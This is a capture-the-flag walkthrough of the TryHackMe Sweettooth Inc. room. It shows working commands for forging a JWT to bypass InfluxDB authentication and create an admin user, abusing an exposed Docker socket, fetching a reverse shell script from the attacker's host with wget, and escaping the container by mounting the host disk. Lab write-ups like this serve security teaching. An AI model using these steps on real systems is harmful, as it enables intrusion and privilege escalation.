---
title: TryHackMe Sweettooth Inc.
date: 2021-07-28T12:16:24+05:30
lastmod: 2021-07-28T12:16:24+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://bit.ly/34sGFiK
cover: /img/thm.gif # for tryhackMe

categories:
  - TryHackMe
tags:
  - tryhackme
  - rooms
  - thm
  - sweettoothinc

draft: false
description: TryHackMe Room Sweettooth Inc solved by Animesh Roy. Sweettooth Inc. needs your help to find out how secure their system is!

---

## OverView

|||
|---|---|
| <script src="https://tryhackme.com/badge/434937"></script>| <a class="twitter-follow-button" href="https://twitter.com/anir0y" data-size="large"> Follow @anir0y<a>|
|Sweettooth Inc|![logo](https://tryhackme-images.s3.amazonaws.com/room-icons/33632296aaf0a3545edaf9a386aade62.jpeg)|
| <b> Room [Subscription Required] </b>| [Sweettooth Inc](https://tryhackme.com/room/sweettoothinc)|
|tools (additional) | Docker CE|
---

## Task 01:  Deploy the machine

---

## Task 02:Enumeration

### Recon

- nmap (basic scan)

  ```bash
  sudo nmap -sC -sV -oN nmap/init 10.10.187.112
  [sudo] password for anir0y: 
  Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-28 12:20 IST
  Nmap scan report for 10.10.187.112
  Host is up (0.19s latency).
  Not shown: 997 closed ports
  PORT     STATE SERVICE VERSION
  111/tcp  open  rpcbind 2-4 (RPC #100000)
  | rpcinfo: 
  |   program version    port/proto  service
  |   100000  2,3,4        111/tcp   rpcbind
  |   100000  2,3,4        111/udp   rpcbind
  |   100000  3,4          111/tcp6  rpcbind
  |   100000  3,4          111/udp6  rpcbind
  |   100024  1          41045/udp   status
  |   100024  1          55132/udp6  status
  |   100024  1          55323/tcp   status
  |_  100024  1          56412/tcp6  status
  2222/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
  | ssh-hostkey: 
  |   1024 b0:ce:c9:21:65:89:94:52:76:48:ce:d8:c8:fc:d4:ec (DSA)
  |   2048 7e:86:88:fe:42:4e:94:48:0a:aa:da:ab:34:61:3c:6e (RSA)
  |   256 04:1c:82:f6:a6:74:53:c9:c4:6f:25:37:4c:bf:8b:a8 (ECDSA)
  |_  256 49:4b:dc:e6:04:07:b6:d5:ab:c0:b0:a3:42:8e:87:b5 (ED25519)
  8086/tcp open  http    InfluxDB http admin 1.3.0
  |_http-title: Site doesn't have a title (text/plain; charset=utf-8).
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 21.84 seconds
  ```

### 2.1 : Do a TCP portscan. What is the name of the database software running on one of these ports?

- `InfluxDB`

---
<!-- Google Ads -->
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-3526678290068011"
     data-ad-slot="7160066188"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
<!-- END -->

---

## Task 03: Database exploration and user flag

- recon InfluxDB (ref: [Link](https://www.komodosec.com/post/when-all-else-fails-find-a-0-day))

- try to find username by runnning this command
  `http://10.10.187.112:8086/debug/requests`

  ![img](https://i.imgur.com/qUOM1Hh.png)

- generate a valid JWT Token using jwt.io
  
  ![img](https://i.imgur.com/dDGXbqT.png)

- run the CLI to find `db`

     ```bash
     curl -G "http://10.10.187.112:8086/query?db=demodb" \
     --data-urlencode "q=SHOW DATABASES" \
     --header "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im81eVk2eXlhIiwiZXhwIjoxNjI3NTQzNjY4fQ.TD8pdKpmXTL7fXYuVUWmbqy3GXDESNaR02Apqf_Y1vk"
     ```

- payload 2 (create user)
  
     ```bash
     curl -X POST -G "http://10.10.187.112:8086/query?db=demodb" \
     --data-urlencode "q=CREATE USER admin WITH PASSWORD 'thm@anir0y' WITH ALL PRIVILEGES" \
     --header "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im81eVk2eXlhIiwiZXhwIjoxNjI3NTQzNjY4fQ.TD8pdKpmXTL7fXYuVUWmbqy3GXDESNaR02Apqf_Y1vk"
     ```

- downlaod & config influxdb-client

     ```bash
     sudo apt install influxdb-client
     ```

- connect with remote db
  
  ![img](https://i.imgur.com/blVEP3P.png)

- read the creds.
  
  ![img](https://i.imgur.com/uSw7QvY.png)

- ssh into box with creds
  
  ![img](https://i.imgur.com/xiJRGU5.png)

### 3.2: What was the temperature of the water tank at 1621346400 (UTC Unix Timestamp)?

- connect to DB
  `influx -host 10.10.234.201 -port 8086 -username admin -password 'thm@anir0y'`

- check the data
  
  ```bash
  # stage 1: connect to db
  influx -host 10.10.234.201 -port 8086 -username admin -password 'thm@anir0y'
  Connected to http://10.10.234.201:8086 version 1.3.0
  InfluxDB shell version: 1.6.7~rc0

  # Find DB
  > show databases;
  name: databases
  name
  ----
  ...
  mixer
  ...

  # use db
  > use tanks;
  Using database tanks

  # Find Tables
  > show measurements
  name: measurements
  name
  ----
  ...
  water_tank

  # Find the data
  > select * from water_tank
  [snip]
  1621346400000000000 92.7           22.5
  [snip]
  ```

### 3.3: What is the highest rpm the motor of the mixer reached?

  ```bash
  # Connect to db
  influx -host 10.10.234.201 -port 8086 -username admin -password 'thm@anir0y'

  # show databases;
  mixer 

  # show measurements;
  name: measurements
  name
  ----
  mixer_stats

  # select * from mixer_stats
  save the output to a file
  # select * from mixer_stats

  # head mixer
  name: mixer_stats
  time                filling_height motor_rpm temperature
  ----                -------------- --------- -----------
  1621166400000000000 60.72          4372      66.35
  1621170000000000000 63.8           4688      64.17
  1621173600000000000 64.77          4502      72.42
  1621177200000000000 58.89          4354      69.26
  1621180800000000000 59.68          4050      60.85
  1621184400000000000 62.33          4416      70.12

  # run awk & cat to find out

  cat mixer | awk -F ' ' '{print $3}' | sort
  ans is the last return.
  ```

---

## task 04: Privilege escalation

- login to `SSH`
- run linpeas to find out running services.

    ```bash
    # intresting findings

    # Docker Container details

    You have write permissions over Docker socket `/run/docker.sock`                                                        

    Container ID ╣ 
    Container Full ID : 7d5a0b6ac4900c50223626d27a81978a5b2a0641ca7e50002512a120be0394d1

    ╣ Cleaned processes
    ╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
    root         1  0.0  0.2  20048  2796 ?        Ss   10:20   0:00 /bin/bash -c chmod a+rw /var/run/docker.sock && service ssh start & /bin/su uzJk6Ry98d8C -c '/initializeandquery.sh & /entrypoint.sh influxd'

    root         8  0.0  0.2  44764  2596 ?        S    10:20   0:00 /bin/su uzJk6Ry98d8C -c /initializeandquery.sh & /entrypoint.sh influxd

    ```

  > some kind of Docker things??

- PS AUX

    ```bash
    uzJk6Ry98d8C@7d5a0b6ac490:~$ ps aux
    USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
    root         1  0.0  0.2  20048  2796 ?        Ss   10:20   0:00 /bin/bash -c chmod a+rw /var/run/docker.sock && servi
    root         8  0.0  0.2  44764  2596 ?        S    10:20   0:00 /bin/su uzJk6Ry98d8C -c /initializeandquery.sh & /ent
    uzJk6Ry+    19  0.0  0.2  11620  2364 ?        Ss   10:20   0:00 bash -c /initializeandquery.sh & /entrypoint.sh influ
    uzJk6Ry+    20  0.0  0.2  11676  2512 ?        S    10:20   0:00 /bin/bash /initializeandquery.sh
    ```

  > seems like we have a local port `localhost:8088` listening locally.

- read the file
  
  ```bash
  ...
  socat TCP-LISTEN:8080,reuseaddr,fork UNIX-CLIENT:/var/run/docker.sock &
  ...
  ```

- port forwarding

  ```bash
  ssh uzJk6Ry98d8C@10.10.234.201 -p2222 -L 8080:localhost:8080
  ```

  ![img](https://i.imgur.com/5p0pS0r.png)

- findings

  ```cat
  Container: 
  Image "sweettoothinc:latest"
  ```

- connect Docker Container:

  ```bash
  # list container 
  docker -H tcp://localhost:8080 container ls   
                            
  CONTAINER ID   IMAGE                  COMMAND                  CREATED          STATUS             PORTS                                          NAMES
  7d5a0b6ac490   sweettoothinc:latest   "/bin/bash -c 'chmod…"   50 minutes ago   Up About an hour   0.0.0.0:8086->8086/tcp, 0.0.0.0:2222->22/tcp   sweettoothinc
  ```

- list docker files

  ```bash
  docker -H tcp://localhost:8080 container exec sweettoothinc ls
  bin
  boot
  dev
  entrypoint.sh
  etc
  home
  initializeandquery.sh
  lib
  lib64
  media
  mnt
  opt
  proc
  root
  run
  sbin
  srv
  sys
  tmp
  usr
  var
  ```

- get a rev shell

  ``` bash
  # upload a rev shell
  # get it from here: https://shell.anir0y.in
  docker -H tcp://localhost:8080 container exec sweettoothinc wget http://10.17.4.40/shell.sh

  # exec the shell
  docker -H tcp://localhost:8080 container exec sweettoothinc bash -i shell.sh
  ```

  ![img](https://i.imgur.com/BxTvhXV.png)

- read the root.txt in `/root/root.txt`

---

## task 05: Escape

- we're in a container, let's escape the container and get Host root.txt file.

- reading disk lists revels intresting info:

  ```bash
  fdisk -l

  Disk /dev/xvda: 16 GiB, 17179869184 bytes, 33554432 sectors
  Units: sectors of 1 * 512 = 512 bytes
  Sector size (logical/physical): 512 bytes / 512 bytes
  I/O size (minimum/optimal): 512 bytes / 512 bytes
  Disklabel type: dos
  Disk identifier: 0xa8257195

  Device     Boot    Start      End  Sectors  Size Id Type
  /dev/xvda1 *        2048 32088063 32086016 15.3G 83 Linux
  /dev/xvda2      32090110 33552383  1462274  714M  5 Extended
  /dev/xvda5      32090112 33552383  1462272  714M 82 Linux swap / Solaris

  Disk /dev/xvdh: 1 GiB, 1073741824 bytes, 2097152 sectors
  Units: sectors of 1 * 512 = 512 bytes
  Sector size (logical/physical): 512 bytes / 512 bytes
  I/O size (minimum/optimal): 512 bytes / 512 bytes

  ```

- mounting `/dev/xvda1`

  ```bash
  root@7d5a0b6ac490:/# mkdir /mnt/temp
  mkdir /mnt/temp
  root@7d5a0b6ac490:/# mount /dev/xvda1 /mnt/temp
  mount /dev/xvda1 /mnt/temp

  root@7d5a0b6ac490:/mnt/temp# cd /mnt/temp/
  root@7d5a0b6ac490:/mnt/temp# cd root
  root@7d5a0b6ac490:/mnt/temp/root# cat root*
  cat root*
  THM{flag-was-here}

  ```

---
<!-- Google Ads -->

<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-3526678290068011"
     data-ad-slot="7160066188"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
<!-- END -->


<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="anir0y" data-description="Support me on Buy me a coffee!" data-message="" data-color="#5F7FFF" data-position="Right" data-x_margin="18" data-y_margin="18"></script>

<!-- EOF -->
